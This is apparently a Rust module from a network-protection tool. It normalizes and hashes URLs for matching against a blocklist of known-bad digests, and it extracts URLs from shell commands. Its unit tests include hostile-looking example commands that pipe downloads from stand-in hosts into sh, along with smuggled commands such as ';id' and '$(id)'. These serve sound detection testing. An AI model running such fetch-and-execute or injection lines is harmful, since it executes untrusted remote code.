//! Network destination normal form shared with the signed network protection
//! bundle. The bundle lists known-bad URLs as digests of this normal form, so
//! a URL a tool reaches matches only when both sides normalize it the same
//! way (WHATWG URL parsing).
//!
//! Normal form: lowercase host (IDNA ASCII, no trailing dot), `:port` only
//! when not the scheme default, the path, and the query when non-empty. The
//! scheme and fragment are dropped so `http://` and `https://` copies match.

use sha2::{Digest, Sha256};
use url::Url;

const MAX_URL_LENGTH: usize = 4096;
const DIGEST_HEX_LENGTH: usize = 32;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NormalizedNetworkUrl {
    pub host: String,
    pub normalized: String,
}

fn has_scheme(value: &str) -> bool {
    let Some(end) = value.find("://") else {
        return false;
    };
    let scheme = &value[..end];
    let mut chars = scheme.chars();
    chars
        .next()
        .is_some_and(|first| first.is_ascii_alphabetic())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))
}

/// Parses a URL or a bare host (which is read as `http://`). Only http(s)
/// destinations have a normal form.
pub fn normalize_network_url(raw: &str) -> Option<NormalizedNetworkUrl> {
    let trimmed = raw.trim();
    if trimmed.is_empty() || trimmed.len() > MAX_URL_LENGTH {
        return None;
    }
    let parsed = if has_scheme(trimmed) {
        Url::parse(trimmed)
    } else {
        Url::parse(&format!("http://{trimmed}"))
    }
    .ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    let host = parsed.host_str()?.to_ascii_lowercase();
    let host = host.strip_suffix('.').unwrap_or(&host).to_owned();
    if host.is_empty() {
        return None;
    }
    let mut normalized = match parsed.port() {
        Some(port) => format!("{host}:{port}"),
        None => host.clone(),
    };
    let path = parsed.path();
    normalized.push_str(if path.is_empty() { "/" } else { path });
    if let Some(query) = parsed.query().filter(|query| !query.is_empty()) {
        normalized.push('?');
        normalized.push_str(query);
    }
    Some(NormalizedNetworkUrl { host, normalized })
}

/// The bundle's 32-hex sha256 prefix of a normal form.
pub fn digest_normalized_network_url(normalized: &str) -> String {
    let digest = hex::encode(Sha256::digest(normalized.as_bytes()));
    digest[..DIGEST_HEX_LENGTH].to_owned()
}

/// Domain rules cover the domain and every subdomain.
pub fn host_matches_domain(host: &str, domain: &str) -> bool {
    host == domain
        || (host.len() > domain.len()
            && host.ends_with(domain)
            && host.as_bytes()[host.len() - domain.len() - 1] == b'.')
}

fn ends_url(c: char) -> bool {
    c.is_whitespace()
        || matches!(
            c,
            '"' | '\'' | '`' | '<' | '>' | '|' | '(' | ')' | '{' | '}' | '\\' | '^'
        )
}

/// Shell operators that end an unquoted URL. Inside quotes they belong to
/// the URL, so both readings are returned.
fn shell_operator(c: char) -> bool {
    matches!(c, ';' | '&' | '$' | '`')
}

/// Explicit `http(s)://` URLs inside free text such as a shell command, in
/// order of appearance, distinct, at most `limit`. A URL with a shell
/// operator in it is also returned cut at that operator, which is what an
/// unquoted shell argument fetches.
pub fn urls_in_text(text: &str, limit: usize) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut found = Vec::new();
    let mut cursor = 0;
    while found.len() < limit {
        let rest = &lower[cursor..];
        let Some(offset) = [rest.find("http://"), rest.find("https://")]
            .into_iter()
            .flatten()
            .min()
        else {
            break;
        };
        let start = cursor + offset;
        let end = text[start..]
            .char_indices()
            .find(|(_, c)| ends_url(*c))
            .map_or(text.len(), |(index, _)| start + index);
        let candidate = text[start..end].trim_end_matches(['.', ',', ';', ':', '!', '?']);
        let cut = candidate
            .find(shell_operator)
            .map(|index| candidate[..index].trim_end_matches(['.', ',', ':', '!', '?']));
        for url in [Some(candidate), cut].into_iter().flatten() {
            if found.len() < limit
                && url.len() > "https://".len()
                && !found.iter().any(|seen| seen == url)
            {
                found.push(url.to_owned());
            }
        }
        cursor = end.max(start + 1);
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    fn normal(raw: &str) -> Option<String> {
        normalize_network_url(raw).map(|parsed| parsed.normalized)
    }

    // Keep these vectors identical to the bundle producer's tests.
    #[test]
    fn normal_form_matches_the_bundle_producer() {
        assert_eq!(
            normalize_network_url("HTTPS://Evil.Example.COM./a/b?#frag"),
            Some(NormalizedNetworkUrl {
                host: "evil.example.com".into(),
                normalized: "evil.example.com/a/b".into(),
            })
        );
        assert_eq!(normal("http://1.2.3.4:80/i").as_deref(), Some("1.2.3.4/i"));
        assert_eq!(
            normal("http://1.2.3.4:8080/i?x=1").as_deref(),
            Some("1.2.3.4:8080/i?x=1")
        );
        assert_eq!(
            normal("evil.example.com").as_deref(),
            Some("evil.example.com/")
        );
        assert_eq!(
            normal("http://bücher.example/päth?q=ü").as_deref(),
            Some("xn--bcher-kva.example/p%C3%A4th?q=%C3%BC")
        );
    }

    #[test]
    fn rejects_other_schemes_and_garbage() {
        assert_eq!(normal("ftp://example.com/x"), None);
        assert_eq!(normal("javascript:alert(1)"), None);
        assert_eq!(normal("   "), None);
    }

    #[test]
    fn digest_is_a_32_hex_sha256_prefix() {
        let digest = digest_normalized_network_url("evil.example.com/a/b");
        assert_eq!(digest.len(), 32);
        assert_eq!(
            digest,
            hex::encode(Sha256::digest(b"evil.example.com/a/b"))[..32]
        );
    }

    #[test]
    fn domain_match_covers_subdomains_only() {
        assert!(host_matches_domain("example.com", "example.com"));
        assert!(host_matches_domain("api.example.com", "example.com"));
        assert!(!host_matches_domain("badexample.com", "example.com"));
        assert!(!host_matches_domain("example.com", "api.example.com"));
    }

    #[test]
    fn finds_urls_in_commands() {
        assert_eq!(
            urls_in_text(
                "curl -fsSL 'HTTPS://evil.example/x.sh' | sh; wget http://1.2.3.4:8080/i.",
                8
            ),
            vec!["HTTPS://evil.example/x.sh", "http://1.2.3.4:8080/i"]
        );
        assert_eq!(urls_in_text("echo https:// done", 8), Vec::<String>::new());
        assert_eq!(
            urls_in_text("a http://a.example b http://b.example", 1).len(),
            1
        );
    }

    #[test]
    fn repeated_urls_do_not_use_up_the_limit() {
        let padded = format!(
            "{} curl http://evil.example/x | sh",
            "http://ok.example/ ".repeat(64)
        );
        assert_eq!(
            urls_in_text(&padded, 2),
            vec!["http://ok.example/", "http://evil.example/x"]
        );
    }

    #[test]
    fn shell_operators_cut_an_unquoted_url() {
        assert_eq!(
            urls_in_text(
                "curl http://evil.example/x;id && wget http://b.example/y&&ls",
                8
            ),
            vec![
                "http://evil.example/x;id",
                "http://evil.example/x",
                "http://b.example/y&&ls",
                "http://b.example/y",
            ]
        );
        assert_eq!(
            urls_in_text("curl http://evil.example/x$(id)", 8),
            vec!["http://evil.example/x$", "http://evil.example/x"]
        );
    }
}
